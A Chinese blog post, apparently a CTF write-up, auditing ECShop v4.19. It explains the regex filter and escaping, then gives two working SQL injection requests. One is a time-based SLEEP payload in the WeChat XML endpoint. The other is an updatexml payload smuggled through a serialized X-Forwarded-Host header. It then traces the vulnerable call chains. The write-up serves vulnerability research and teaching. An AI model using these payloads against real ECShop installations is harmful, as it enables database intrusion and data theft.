@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="版本 ：v4.19 强网拟态的一道题，网上大多都不公开poc，这里分享一下我的分析过程 安全机制去网上搜索一下历史漏洞会发现，ECshop这套代码爆出过不少sql注入漏洞  是因为这套系统很喜欢直接把变量拼接到sql语句中（看起来已经被各位师傅审烂了） 修修补补之后，即使直接拼接变量，也不太好找sql注入了，主要是以下两个地方增加了安全校验  每个文件都会引入加载 &#x2F;includes&#x2F;init.p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ecshop4.19代码审计">
+<meta property="og:url" content="http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Xsheep">
+<meta property="og:description" content="版本 ：v4.19 强网拟态的一道题，网上大多都不公开poc，这里分享一下我的分析过程 安全机制去网上搜索一下历史漏洞会发现，ECshop这套代码爆出过不少sql注入漏洞  是因为这套系统很喜欢直接把变量拼接到sql语句中（看起来已经被各位师傅审烂了） 修修补补之后，即使直接拼接变量，也不太好找sql注入了，主要是以下两个地方增加了安全校验  每个文件都会引入加载 &#x2F;includes&#x2F;init.p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117222708755.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117223139960.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117223543051.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117223648661.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117223745509.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117224018264.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117224438068.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117224612949.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117225151828.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117230742066.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117230918937.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117231044074.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117231140953.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117231440342.png">
+<meta property="og:image" content="http://example.com/imgs/img/image-20251117231503425.png">
+<meta property="og:image" content="http://example.com/imgs/img/aa6e087f479c0cc395f24417c6fa08e.png">
+<meta property="article:published_time" content="2025-11-17T15:45:35.047Z">
+<meta property="article:modified_time" content="2025-11-17T15:47:54.348Z">
+<meta property="article:author" content="Xsheep">
+<meta property="article:tag" content="网络安全博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/img/image-20251117222708755.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ecshop4.19代码审计</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Xsheep" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Ecshop4.19代码审计"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Ecshop4.19代码审计"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ecshop4.19代码审计&body=Check out this article: http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Ecshop4.19代码审计&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Ecshop4.19代码审计"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">安全机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">模式匹配</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.</span> <span class="toc-text">SQL注入-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">3.</span> <span class="toc-text">SQL注入-2</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ecshop4.19代码审计
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Xsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-17T15:45:35.047Z" class="dt-published" itemprop="datePublished">2025-11-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>版本</strong> ：v4.19</p>
+<p>强网拟态的一道题，网上大多都不公开poc，这里分享一下我的分析过程</p>
+<h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><p>去网上搜索一下历史漏洞会发现，ECshop这套代码爆出过不少sql注入漏洞</p>
+<p><img src="/imgs/img/image-20251117222708755.png" alt="image-20251117222708755"></p>
+<p>是因为这套系统很喜欢直接把变量拼接到sql语句中（看起来已经被各位师傅审烂了）</p>
+<p>修修补补之后，即使直接拼接变量，也不太好找sql注入了，主要是以下两个地方增加了安全校验</p>
+<p><img src="/imgs/img/image-20251117223139960.png" alt="image-20251117223139960"></p>
+<p>每个文件都会引入加载 <code>/includes/init.php</code>，安全的检查主要在这个文件里</p>
+<p>进入<code>init.php</code>可以看到，加载了一个<code>safety.php</code></p>
+<p><img src="/imgs/img/image-20251117223543051.png" alt="image-20251117223543051"> </p>
+<h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><p>在<code>safety.php</code> 里，使用正则匹配去匹配危险模式		</p>
+<p><img src="/imgs/img/image-20251117223648661.png" alt="image-20251117223648661"></p>
+<p>会对每个传入的变量进行校验</p>
+<p><img src="/imgs/img/image-20251117223745509.png" alt="image-20251117223745509"></p>
+<p>匹配的较为完善，不是很好绕</p>
+<p>并且在正则匹配过后，还会在<code>init.php</code>里对传入变量进行转义</p>
+<p><img src="/imgs/img/image-20251117224018264.png" alt="image-20251117224018264"></p>
+<p>正则匹配 +  转义，看起来已经无法sql注入了，接下来看各位大哥如何绕过</p>
+<h2 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h2><p>先放poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=wechat_token HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Origin: https://www.xjhao.com.cn</span><br><span class="line">Referer: https://www.xjhao.com.cn/user.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Length: 195</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;Event&gt;scan&lt;/Event&gt;</span><br><span class="line">    &lt;EventKey&gt;&#x27; AND (SELECT 1649 FROM (SELECT(SLEEP(5)))nsIj) AND &#x27;RKvz&#x27;=&#x27;RKvz&lt;/EventKey&gt;</span><br><span class="line">    &lt;FromUserName&gt;123456&lt;/FromUserName&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/img/image-20251117224438068.png" alt="image-20251117224438068"></p>
+<p>根据poc可以知道，<code>user.php</code>的<code>wechat_token</code>接口的漏洞，看代码</p>
+<p><img src="/imgs/img/image-20251117224612949.png" alt="image-20251117224612949"></p>
+<p>实例化一个<code>WeChatEvent</code> —&gt;  用php伪协议拿到请求体  —-&gt; 然后xml转为字符串  —–&gt; 最后用<code>call_user_func</code>去调用方法<br>注意到两点，1. 使用php伪协议，导致传入的参数并没有转义，也不会被检测，之前的检测全部针对于get和post传参</p>
+<p>2.<code>call_user_func_array</code> 的方法名和数据是用户可控</p>
+<p>然后去看<code>WeChatEvent</code>类</p>
+<p><img src="/imgs/img/image-20251117225151828.png" alt="image-20251117225151828"></p>
+<p>全部是直接拼接，最后导致注入</p>
+<h2 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入-2"></a>SQL注入-2</h2><p>已知大量存在变量直接拼接sql语句，上面是利用php伪协议进行的绕过，这里第二处利用的是http请求头<br>注入位置在 <code>user.php</code> 的<code>collection_list</code> 接口</p>
+<p>这个是在 2.X&#x2F;3.X 就爆出来的，只是拿先前版本的打不通，但是只需简单修改就能使用（为什么呢，因为版本不同导致的ehash不同罢了🤪）</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=collection_list HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d; ECSCP_ID=4b2401b5af4843a95a7e19b45f5acb32ec20802b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: https://www.xjhao.com.cn/user.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-Host: 145ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|145ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure>
+
+<p>利用链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()替换变量 --&gt; display() --&gt; insert_mod() 这里分割参数 --&gt; 最后变量拼接sql语句</span><br></pre></td></tr></table></figure>
+
+<p>先看<code>insert_mod</code>方法<br><img src="/imgs/img/image-20251117230742066.png" alt="image-20251117230742066"></p>
+<p>对传入的参数 以<code>|</code>分割，然后调用函数，也就是说我们可以任意调用<code>insert_</code>开头的方法，参数也是由我们定<br>所以去找满足条件的函数<br><img src="/imgs/img/image-20251117230918937.png" alt="image-20251117230918937"></p>
+<p>在<code>lib_clips.php</code>里就有这么一个函数</p>
+<p><code>collection_list</code> 接口也会包含这个文件</p>
+<p><img src="/imgs/img/image-20251117231044074.png" alt="image-20251117231044074"></p>
+<p>接下来看url方法</p>
+<p>触发<code>get_domain</code></p>
+<p><img src="/imgs/img/image-20251117231140953.png" alt="image-20251117231140953"></p>
+<p><code>get_domain</code>会把http请求头中的<code>HTTP_X_FORWARDED_HOST</code>赋值给<code>$host</code>, 然后返回</p>
+<p><img src="/imgs/img/image-20251117231440342.png" alt="image-20251117231440342"></p>
+<p>smarty注册，返回的host被注册进模板变量</p>
+<p><img src="/imgs/img/image-20251117231503425.png" alt="image-20251117231503425"></p>
+<p>最后在display函数里触发sink点，完成闭环</p>
+<p>所以最后的流程就是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()替换变量 --&gt; assign注册变量--&gt; display的时候对变量进行处理，触发insert_mod()  --&gt; insert_mod 这里分割参数，调用用户设定好的函数和参数 --&gt; 最后调用函数，传入参数拼接sql语句</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/img/aa6e087f479c0cc395f24417c6fa08e.png" alt="aa6e087f479c0cc395f24417c6fa08e"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/link/">link</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">安全机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">模式匹配</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.</span> <span class="toc-text">SQL注入-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">3.</span> <span class="toc-text">SQL注入-2</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Ecshop4.19代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Ecshop4.19代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ecshop4.19代码审计&body=Check out this article: http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Ecshop4.19代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Ecshop4.19代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Xsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/link/">link</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
